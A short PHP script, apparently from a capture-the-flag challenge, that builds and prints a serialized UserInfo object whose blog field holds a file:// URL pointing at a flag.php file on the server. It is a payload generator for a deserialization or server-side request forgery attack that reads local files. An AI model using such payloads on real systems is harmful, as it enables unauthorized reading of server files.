<?php
class UserInfo{
    public $name = '' ; //任意填写
    public $age  = '18' ; //任意填写
    public $blog = 'file:///usr/www/html/flag.php' ; //任意填写

}
$user = new UserInfo();
echo serialize($user);

?>